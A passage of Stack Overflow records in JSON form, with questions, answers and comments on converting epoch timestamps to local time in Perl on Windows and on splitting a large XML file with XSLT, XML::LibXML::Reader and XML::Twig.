"https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1446997002, "post_id": 33595046, "comment_id": 54966344, "body": "Our code is pulling five values blackout_host,start_timestamp,stop_timestamp,userid,reason from some flat files in which start_timestamp and start_timestamp time are in epoch and we want to convert it human readable and get the same printed"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 3, "creation_date": 1446997087, "post_id": 33595046, "comment_id": 54966367, "body": "I don&#39;t think you understand what your code is doing."}, {"owner": {"reputation": 1, "user_id": 4558075, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-WmWgnt4cj4s/AAAAAAAAAAI/AAAAAAAAAEc/X2MWplG5coI/photo.jpg?sz=128", "display_name": "Newbie", "link": "https://stackoverflow.com/users/4558075/newbie"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1446997207, "post_id": 33595046, "comment_id": 54966401, "body": "elif [[ &quot;${COMMAND}&quot; == &#39;queryOne&#39; ]] then     if [[ &quot;${BLACKOUTHOST}&quot; == &#39;&#39; ]]     then        blackout_usage        exit 1     fi      ${MCELL_BIN}/mquery -q -c ${MCELL_ETC}/mclient.conf \\                              -n &quot;${CS_BLACKOUT_CELL}&quot; -d -f &#39;csv&#39; \\                              -a &#39;CS_EMB_GBF_BLACKOUTS&#39; \\ blackout_host,start_timestamp,stop_timestamp,userid,reason&#39; \\                              -w &quot;blackout_host: == &#39;${BLACKOUTHOST}&#39;&quot; | $MCELL_HOME/mqt.pl |awk -F &#39;,&#39; &#39; { print $1,echo &quot;from &quot; $2 echo &quot; GMT&quot;,echo &quot;to &quot;$3 echo &quot; GMT&quot;,echo &quot;by &quot; $4,echo &quot;for &quot; $5 }&#39;\\"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446997420, "post_id": 33595046, "comment_id": 54966481, "body": "@Newbie What is that supposed to be?"}, {"owner": {"reputation": 1, "user_id": 4558075, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-WmWgnt4cj4s/AAAAAAAAAAI/AAAAAAAAAEc/X2MWplG5coI/photo.jpg?sz=128", "display_name": "Newbie", "link": "https://stackoverflow.com/users/4558075/newbie"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446998106, "post_id": 33595046, "comment_id": 54966726, "body": "@Matt Jacob by your code we are getting  testwin1,1446997690,1446998590,kkulka11,testing testwin1,1446997892,1446998792,kkulka111,testing 15 from  to Thu Jan  1 05:30:00 1970 by Thu Jan  1 05:30:00 1970 for"}, {"owner": {"reputation": 1, "user_id": 4558075, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-WmWgnt4cj4s/AAAAAAAAAAI/AAAAAAAAAEc/X2MWplG5coI/photo.jpg?sz=128", "display_name": "Newbie", "link": "https://stackoverflow.com/users/4558075/newbie"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446998164, "post_id": 33595046, "comment_id": 54966741, "body": "@Matt Jacob output should be exactly s that of yours but we are getting above .."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 2, "creation_date": 1446998655, "post_id": 33595046, "comment_id": 54966919, "body": "Then you either didn&#39;t copy and paste correctly, or your input isn&#39;t what you said it is. You can see the complete input and output in my answer!"}, {"owner": {"reputation": 1, "user_id": 4558075, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-WmWgnt4cj4s/AAAAAAAAAAI/AAAAAAAAAEc/X2MWplG5coI/photo.jpg?sz=128", "display_name": "Newbie", "link": "https://stackoverflow.com/users/4558075/newbie"}, "edited": false, "score": 0, "creation_date": 1446999297, "post_id": 33595046, "comment_id": 54967143, "body": "The issue that msend_query gives some outeverytime , now how I am getting that print is a query .What should I placed in my <i>DATA</i> value in your logic"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446999613, "post_id": 33595046, "comment_id": 54967250, "body": "You&#39;re creating a file, yes? Now you need to open that file, iterate over it line by line, and apply my logic to it, and everything will work. The <code>__DATA__</code> section is just for creating a self-contained example. Swap out <code>&lt;DATA&gt;</code> with your actual filehandle (you&#39;re opening a file, remember?) and then Bob&#39;s your uncle."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 2, "creation_date": 1446999694, "post_id": 33595046, "comment_id": 54967278, "body": "You&#39;ll probably also want to order <a href=\"https://rads.stackoverflow.com/amzn/click/com/1449303587\" rel=\"nofollow noreferrer\" rel=\"nofollow noreferrer\">this book</a> and choose overnight delivery at checkout."}], "answers": [{"comments": [{"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1446998238, "post_id": 33595701, "comment_id": 54966772, "body": "the request was for the timezone abbr to be in the output too"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "reply_to_user": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 1, "creation_date": 1446998528, "post_id": 33595701, "comment_id": 54966877, "body": "@ysth Good point. He also said &quot;local time&quot; in the subject and then used <code>gmtime()</code> in his code, so I really don&#39;t have any idea what he wants."}, {"owner": {"reputation": 1, "user_id": 4558075, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-WmWgnt4cj4s/AAAAAAAAAAI/AAAAAAAAAEc/X2MWplG5coI/photo.jpg?sz=128", "display_name": "Newbie", "link": "https://stackoverflow.com/users/4558075/newbie"}, "edited": false, "score": 0, "creation_date": 1446998688, "post_id": 33595701, "comment_id": 54966930, "body": "@MattJacob Your output is correct and we need it in similar manner but not sure where we are doing a mistake so it is not coming as desired"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446998761, "post_id": 33595701, "comment_id": 54966958, "body": "Well, I&#39;m not sure either. Maybe you should edit your question to show what you&#39;re doing."}, {"owner": {"reputation": 1, "user_id": 4558075, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-WmWgnt4cj4s/AAAAAAAAAAI/AAAAAAAAAEc/X2MWplG5coI/photo.jpg?sz=128", "display_name": "Newbie", "link": "https://stackoverflow.com/users/4558075/newbie"}, "edited": false, "score": 0, "creation_date": 1446999195, "post_id": 33595701, "comment_id": 54967102, "body": "Updated the Question with results as per your suggestion but still not received as desired"}], "tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": false, "score": -1, "last_activity_date": 1447015939, "last_edit_date": 1495542220, "creation_date": 1446997201, "answer_id": 33595701, "question_id": 33595046, "link": "https://stackoverflow.com/questions/33595046/convert-epoch-to-local-time-in-perl-on-windows/33595701#33595701", "title": "Convert epoch to local time in perl on windows", "body": "<pre><code>while (&lt;DATA&gt;) {\n    chomp;\n\n    my @parts = split(/,/, $_);\n    $parts[1] = localtime($parts[1]);\n    $parts[2] = localtime($parts[2]);\n\n    printf(\"%s from %s to %s by %s for %s\\n\", @parts);\n}\n\n__DATA__\ntestingwindows,1446727960,1446728560,kkulka11,testingwin\ntestingwindows1,1446727160,141228560,kkulka11,testingwin\ntestingwindows2,1446727120,1446728560,kkulka11,testingwin\ntestingwindows3,1446727960,1446728560,kkulka11,testingwin\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>testingwindows from Thu Nov  5 05:52:40 2015 to Thu Nov  5 06:02:40 2015 by kkulka11 for testingwin\ntestingwindows1 from Thu Nov  5 05:39:20 2015 to Sun Jun 23 07:09:20 1974 by kkulka11 for testingwin\ntestingwindows2 from Thu Nov  5 05:38:40 2015 to Thu Nov  5 06:02:40 2015 by kkulka11 for testingwin\ntestingwindows3 from Thu Nov  5 05:52:40 2015 to Thu Nov  5 06:02:40 2015 by kkulka11 for testingwin\n</code></pre>\n\n<hr>\n\n<p>Edit: based on your most recent update to the question, I now believe that you're trying to capture the output of the command and process it. Since you haven't provided a <a href=\"https://stackoverflow.com/help/mcve\">minimal, complete, and verifiable example</a>, and because I have no idea what <code>mquery</code> is and you haven't provided an explanation for that, either, I present to you this guess:</p>\n\n<pre><code>if ($COMMAND eq 'queryone') {\n    my @lines = `$MCELL_HOME\\\\bin\\\\mquery -q -c $MCELL_HOME\\\\etc\\\\mclient.conf -n $CS_BLACKOUT_CELL -d -f csv -a CS_EMB_GBF_BLACKOUTS -s blackout_host,start_timestamp,stop_timestamp,userid,reason -w blackout_host: == '${BLACKOUTHOST}'`;\n\n    for (@lines) {\n        chomp;\n\n        my @parts = split(/,/, $_);\n        $parts[1] = localtime($parts[1]);\n        $parts[2] = localtime($parts[2]);\n\n        printf(\"%s from %s to %s by %s for %s\\n\", @parts);\n    }       \n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 4558075, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-WmWgnt4cj4s/AAAAAAAAAAI/AAAAAAAAAEc/X2MWplG5coI/photo.jpg?sz=128", "display_name": "Newbie", "link": "https://stackoverflow.com/users/4558075/newbie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 152, "favorite_count": 0, "answer_count": 1, "score": -4, "last_activity_date": 1447062480, "creation_date": 1446992882, "last_edit_date": 1447062480, "question_id": 33595046, "link": "https://stackoverflow.com/questions/33595046/convert-epoch-to-local-time-in-perl-on-windows", "title": "Convert epoch to local time in perl on windows", "body": "<p>We are trying to convert the output received from the below code </p>\n\n<p>The current output is in this form </p>\n\n<pre><code>testingwindows,1446727960,1446728560,kkulka11,testingwin\ntestingwindows1,1446727160,141228560,kkulka11,testingwin\ntestingwindows2,1446727120,1446728560,kkulka11,testingwin\ntestingwindows3,1446727960,1446728560,kkulka11,testingwin\n</code></pre>\n\n<p>The output required is something like </p>\n\n<pre><code>testingwindows from Fri Oct  3 13:51:05 2015 GMT to Mon Nov  9 13:51:05 2015 GMT by kkulka11 for testingwin.\ntestingwindows1 from Fri Oct 2 13:51:05 2015 GMT to Mon Nov  9 13:51:05 2015 GMT by kkulka11 for testingwin.\ntestingwindows2 from Fri Oct 2 13:51:05 2015 GMT to Mon Nov  9 13:51:05 2015 GMT by kkulka11 for testingwin.\ntestingwindows3 from Fri Oct 12 13:51:05 2015 GMT to Mon Nov  9 13:51:05 2015 GMT by kkulka11 for testingwin.\n</code></pre>\n\n<p>This is my current code</p>\n\n<pre><code>if ( $COMMAND eq 'queryone' ) {\n    my $msend_query = \"$MCELL_HOME\\\\bin\\\\mquery\";\n    my @args_query = (\n        $msend_query,\n        \"-q\",\n        \"-c\", \"$MCELL_HOME\\\\etc\\\\mclient.conf\",\n        \"-n\", \"$CS_BLACKOUT_CELL\",\n        \"-d\",\n        \"-f\", \"csv\",\n        \"-a\", \"CS_EMB_GBF_BLACKOUTS\" ,\n        \"-s\", \"blackout_host,start_timestamp,stop_timestamp,userid,reason\",\n        \"-w\", \"blackout_host: == '${BLACKOUTHOST}'\"\n    );\n    system(@args_query);\n</code></pre>\n\n<p>We tried using  <code>perl -pe 's/(\\d{10})/gmtime($1)/e';</code> but not able to convert and it gives this error </p>\n\n<blockquote>\n  <p>'o~}go\u2302\u2302t\u2302x\u2302w' is not recognized as an internal or external command,\n  operable program or batch file.</p>\n</blockquote>\n\n<p>when we used the code as</p>\n\n<pre><code>if ( $COMMAND eq 'queryone' ) {\n    my $msend_query = \"$MCELL_HOME\\\\bin\\\\mquery\";\n    my $mqt = \"$MCELL_HOME\\\\mqt.pl\";\n    my @args_query = (\n        $msend_query,\n        \"-q\",\n        \"-c\", \"$MCELL_HOME\\\\etc\\\\mclient.conf\",\n        \"-n\", \"$CS_BLACKOUT_CELL\",\n        \"-d\",\n        \"-f\", \"csv\",\n        \"-a\", \"CS_EMB_GBF_BLACKOUTS\",\n        \"-s\", \"blackout_host,start_timestamp,stop_timestamp,userid,reason\",\n        \"-w\", \"blackout_host: == '${BLACKOUTHOST}'\"\n    ) | $mqt;\n    system(@args_query);\n</code></pre>\n\n<p>Needed experts quick help and guidance to achieve the output in human-readable format.</p>\n\n<p><strong>Edit:</strong></p>\n\n<p>Updated  the code as per Jacob comments but still not received the output as desired. Please suggest</p>\n\n<pre><code>if ( $COMMAND eq 'queryone' ) {\n    my $msend_query = \"$MCELL_HOME\\\\bin\\\\mquery\";\n    my @args_query = (\n        $msend_query,\n        \"-q\",\n        \"-c\", \"$MCELL_HOME\\\\etc\\\\mclient.conf\",\n        \"-n\", \"$CS_BLACKOUT_CELL\",\n        \"-d\",\n        \"-f\", \"csv\",\n        \"-a\", \"CS_EMB_GBF_BLACKOUTS\" ,\n        \"-s\", \"blackout_host,start_timestamp,stop_timestamp,userid,reason\",\n        \"-w\", \"blackout_host: == '${BLACKOUTHOST}'\"\n    );\n    chomp;\n    my @parts = split(/,/, system(@args_query));\n    $parts[1] = localtime($parts[1]);\n    $parts[2] = localtime($parts[2]);\n    printf(\"%s from %s to %s by %s for %s\\n\", @parts);\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>M:\\AbhayBackup\\PerlKK&gt;test.pl -q -h testingwin\ntestingwin\nsub: testingwin\ntestingwin,1446727960,1446728560,kkulka11,testingwin\n0 from Thu Jan  1 05:30:00 1970 to Thu Jan  1 05:30:00 1970 by  for\n</code></pre>\n"}, {"tags": ["xml", "perl"], "comments": [{"owner": {"reputation": 137664, "user_id": 252228, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/3ea75023c3c487f36257090d420b7c50?s=128&d=identicon&r=PG", "display_name": "Martin Honnen", "link": "https://stackoverflow.com/users/252228/martin-honnen"}, "edited": false, "score": 0, "creation_date": 1446983920, "post_id": 33591873, "comment_id": 54962421, "body": "Have you though about doing it with XSLT? I think libxslt can be used from Perl and it supports exsl:document <a href=\"http://exslt.org/exsl/elements/document/index.html\" rel=\"nofollow noreferrer\">exslt.org/exsl/elements/document/index.html</a> so there you could have a proper handling of XML."}, {"owner": {"reputation": 2081, "user_id": 1396141, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/a0784eb7d2bc98806e360d6d86989cf1?s=128&d=identicon&r=PG", "display_name": "\u0422\u043e\u043c\u0438\u0446\u0430 \u041a\u043e\u0440\u0430\u045b", "link": "https://stackoverflow.com/users/1396141/%d0%a2%d0%be%d0%bc%d0%b8%d1%86%d0%b0-%d0%9a%d0%be%d1%80%d0%b0%d1%9b"}, "reply_to_user": {"reputation": 137664, "user_id": 252228, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/3ea75023c3c487f36257090d420b7c50?s=128&d=identicon&r=PG", "display_name": "Martin Honnen", "link": "https://stackoverflow.com/users/252228/martin-honnen"}, "edited": false, "score": 0, "creation_date": 1446985961, "post_id": 33591873, "comment_id": 54962962, "body": "Unfortunately I know next to nothing about XSLT. I&#39;ll surely have to dedicate a few weeks to get a firm grip of it, but with this particular problem it feels like it would take too long to switch to XSLT since it&#39;s almost done, just this one bug spoiling it all."}, {"owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 0, "creation_date": 1446987465, "post_id": 33591873, "comment_id": 54963371, "body": "<code>if &#47;...&#47;; print &quot;...&quot;;</code> strikes me as strange: what is the if going to achieve if there is nothing within the if block?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 1, "creation_date": 1447005128, "post_id": 33591873, "comment_id": 54969163, "body": "@bytepusher: That&#39;s <code>if</code> as a statement modifier. Its <code>open(...) if &#47;...&#47;;</code>"}, {"owner": {"reputation": 2081, "user_id": 1396141, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/a0784eb7d2bc98806e360d6d86989cf1?s=128&d=identicon&r=PG", "display_name": "\u0422\u043e\u043c\u0438\u0446\u0430 \u041a\u043e\u0440\u0430\u045b", "link": "https://stackoverflow.com/users/1396141/%d0%a2%d0%be%d0%bc%d0%b8%d1%86%d0%b0-%d0%9a%d0%be%d1%80%d0%b0%d1%9b"}, "reply_to_user": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 0, "creation_date": 1447013663, "post_id": 33591873, "comment_id": 54972336, "body": "@bytepusher I&#39;m not sure if I understand. I need the <code>if</code> block so that I can reuse the attribute values."}, {"owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 0, "creation_date": 1447021584, "post_id": 33591873, "comment_id": 54974838, "body": "I dunno why I read in half sentences today. never mind me, sorry."}], "answers": [{"comments": [{"owner": {"reputation": 2081, "user_id": 1396141, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/a0784eb7d2bc98806e360d6d86989cf1?s=128&d=identicon&r=PG", "display_name": "\u0422\u043e\u043c\u0438\u0446\u0430 \u041a\u043e\u0440\u0430\u045b", "link": "https://stackoverflow.com/users/1396141/%d0%a2%d0%be%d0%bc%d0%b8%d1%86%d0%b0-%d0%9a%d0%be%d1%80%d0%b0%d1%9b"}, "edited": false, "score": 0, "creation_date": 1447013568, "post_id": 33594772, "comment_id": 54972307, "body": "Martin thanks a lot. This works great. But there&#39;s one thing I forgot to mention. My <code>original.xml</code> has over <b>one million</b> <code>parent</code> tags. When I run your code, it does work as intended, but it completely blocks my computer. It would take hours, if not days to complete it all. On the other hand, my previous script was significantly faster and more efficient. This is why I decided to use it in the first place. Is there any way to just stick to perl?"}, {"owner": {"reputation": 137664, "user_id": 252228, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/3ea75023c3c487f36257090d420b7c50?s=128&d=identicon&r=PG", "display_name": "Martin Honnen", "link": "https://stackoverflow.com/users/252228/martin-honnen"}, "reply_to_user": {"reputation": 2081, "user_id": 1396141, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/a0784eb7d2bc98806e360d6d86989cf1?s=128&d=identicon&r=PG", "display_name": "\u0422\u043e\u043c\u0438\u0446\u0430 \u041a\u043e\u0440\u0430\u045b", "link": "https://stackoverflow.com/users/1396141/%d0%a2%d0%be%d0%bc%d0%b8%d1%86%d0%b0-%d0%9a%d0%be%d1%80%d0%b0%d1%9b"}, "edited": false, "score": 0, "creation_date": 1447067143, "post_id": 33594772, "comment_id": 54990019, "body": "@\u0422\u043e\u043c\u0438\u0446\u0430\u041a\u043e\u0440\u0430\u045b, I have added an alternative approach that should perform better when reading huge files."}], "tags": [], "owner": {"reputation": 137664, "user_id": 252228, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/3ea75023c3c487f36257090d420b7c50?s=128&d=identicon&r=PG", "display_name": "Martin Honnen", "link": "https://stackoverflow.com/users/252228/martin-honnen"}, "is_accepted": false, "score": 1, "last_activity_date": 1447065851, "last_edit_date": 1447065851, "creation_date": 1446991250, "answer_id": 33594772, "question_id": 33591873, "link": "https://stackoverflow.com/questions/33591873/split-and-process-xml-file/33594772#33594772", "title": "Split and process XML file", "body": "<p>I would suggest to use XSLT to solve that, for instance LibXSLT has support for <code>exsl:document</code> (see <a href=\"http://exslt.org/exsl/elements/document/index.html\" rel=\"nofollow\">http://exslt.org/exsl/elements/document/index.html</a>) and that way you can write an XSLT stylesheet doing</p>\n\n<pre><code>&lt;xsl:stylesheet\n  xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n  xmlns:exsl=\"http://exslt.org/common\"\n  extension-element-prefixes=\"exsl\"\n  exclude-result-prefixes=\"exsl\"\n  version=\"1.0\"&gt;\n\n&lt;xsl:template match=\"/\"&gt;\n  &lt;xsl:apply-templates select=\"root/parent[@attr1]\" mode=\"new\"/&gt;\n&lt;/xsl:template&gt;\n\n&lt;xsl:template match=\"parent\" mode=\"new\"&gt;\n  &lt;xsl:message&gt;Writing file &lt;xsl:value-of select=\"@attr1\"/&gt;&lt;/xsl:message&gt;\n  &lt;exsl:document href=\"{@attr1}.xml\" method=\"xml\" indent=\"yes\"&gt;\n    &lt;newroot&gt;\n      &lt;xsl:apply-templates select=\".\"/&gt;\n    &lt;/newroot&gt;\n  &lt;/exsl:document&gt;\n&lt;/xsl:template&gt;\n\n&lt;xsl:template match=\"parent\"&gt;\n  &lt;newparent&gt;\n    &lt;xsl:copy-of select=\"@*\"/&gt;\n  &lt;/newparent&gt;\n&lt;/xsl:template&gt;\n\n&lt;/xsl:stylesheet&gt;\n</code></pre>\n\n<p>which splits the XML input document, creating one result file for each <code>root/parent</code> element with an <code>attr1</code> attribute, creating a new root in those files named <code>newroot</code>, transforming the <code>parent</code> element to <code>newparent</code> and copying its attributes.</p>\n\n<p>You can run a stylesheet in Perl using </p>\n\n<pre><code>  use XML::LibXSLT;\n  use XML::LibXML;\n\n  my $xslt = XML::LibXSLT-&gt;new();\n\n  my $source = XML::LibXML-&gt;load_xml(location =&gt; 'original.xml');\n  my $style_doc = XML::LibXML-&gt;load_xml(location =&gt; 'sheet1.xsl');\n\n  my $stylesheet = $xslt-&gt;parse_stylesheet($style_doc);\n\n  my $results = $stylesheet-&gt;transform($source);\n\n  print $stylesheet-&gt;output_as_bytes($results);\n</code></pre>\n\n<p>As you have indicated in your comment that you have run into memory and/or performance problems, here is an alternative approach making use of <code>LibXML::Reader</code> which is a forwards reading pull parser and does not load the complete XML into an in memory tree structure:</p>\n\n<pre><code>  use strict;\n  use warnings;\n  use XML::LibXML::Reader;\n  use XML::LibXML;\n\n  my $reader = XML::LibXML::Reader-&gt;new(location =&gt; \"input.xml\")\n         or die \"cannot read file.xml\\n\";\n\n  while ($reader-&gt;read) {\n    processNode($reader);\n  }\n\n  sub processNode {\n      my $reader = shift;\n\n      if ($reader-&gt;nodeType == XML_READER_TYPE_ELEMENT &amp;&amp; $reader-&gt;name eq \"parent\")\n      {\n        my $clone = $reader-&gt;copyCurrentNode(0);\n        $clone-&gt;setName('newparent');\n\n        my $doc = XML::LibXML::Document-&gt;new( );\n        $doc-&gt;setDocumentElement($doc-&gt;createElement('newroot'));\n        $doc-&gt;documentElement()-&gt;appendChild($clone);\n\n        my $filePrefix = $clone-&gt;getAttribute('attr1');\n        my $fileName = \"$filePrefix-result.xml\";\n        print \"Writing file $fileName.\\n\";\n\n        $doc-&gt;toFile($fileName, 1);\n\n      }\n  }\n</code></pre>\n\n<p>It should avoid the memory problems, I hope.</p>\n"}, {"comments": [{"owner": {"reputation": 2081, "user_id": 1396141, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/a0784eb7d2bc98806e360d6d86989cf1?s=128&d=identicon&r=PG", "display_name": "\u0422\u043e\u043c\u0438\u0446\u0430 \u041a\u043e\u0440\u0430\u045b", "link": "https://stackoverflow.com/users/1396141/%d0%a2%d0%be%d0%bc%d0%b8%d1%86%d0%b0-%d0%9a%d0%be%d1%80%d0%b0%d1%9b"}, "edited": false, "score": 0, "creation_date": 1447014625, "post_id": 33597993, "comment_id": 54972699, "body": "Sobrique thanks a lot. I tried your code and it also works fine, but with the same down side as Martin&#39;s. Please have a look at <a href=\"http://stackoverflow.com/questions/33591873/split-and-process-xml-file/33597993#comment54972307_33594772\">this comment</a>."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 2081, "user_id": 1396141, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/a0784eb7d2bc98806e360d6d86989cf1?s=128&d=identicon&r=PG", "display_name": "\u0422\u043e\u043c\u0438\u0446\u0430 \u041a\u043e\u0440\u0430\u045b", "link": "https://stackoverflow.com/users/1396141/%d0%a2%d0%be%d0%bc%d0%b8%d1%86%d0%b0-%d0%9a%d0%be%d1%80%d0%b0%d1%9b"}, "edited": false, "score": 0, "creation_date": 1447054202, "post_id": 33597993, "comment_id": 54983255, "body": "Size of XML is important to mention in the question.  But yes, this is doable via twig handlers. I will edit an example when next near a keyboard"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 1, "last_activity_date": 1447064229, "last_edit_date": 1447064229, "creation_date": 1447010490, "answer_id": 33597993, "question_id": 33591873, "link": "https://stackoverflow.com/questions/33591873/split-and-process-xml-file/33597993#33597993", "title": "Split and process XML file", "body": "<p>Don't use a regex. Use a parser. I quite like <a href=\"http://search.cpan.org/dist/XML-Twig/Twig.pm\" rel=\"nofollow\"><code>XML::Twig</code></a>. (<code>XML::LibXML</code> is pretty good too).</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse XML::Twig;\n\nmy $twig = XML::Twig-&gt;new-&gt;parsefile('your_source.xml');\n\nforeach my $parent_elt ( $twig-&gt;findnodes('//parent') ) {\n    #remove children if that's what you want?\n    $_-&gt;delete for $parent_elt-&gt;children();\n    my $newname = $parent_elt-&gt;att('attr1');\n    print \"Opening:\", $newname, \"\\n\";\n    my $new_doc = XML::Twig-&gt;new-&gt;set_root( XML::Twig::Elt-&gt;new('newroot') );\n    $parent_elt-&gt;cut;\n    $parent_elt-&gt;paste( $new_doc-&gt;root );\n\n    $new_doc -&gt; set_pretty_print ('indented_a'); \n    open( my $output, '&gt;', \"$newname.xml\" ) or die $!;\n    print {$output} $new_doc-&gt;sprint;\n    close($output);\n}\n</code></pre>\n\n<p>Given your sample data, this does approximately what you want. </p>\n\n<p>OK, so the 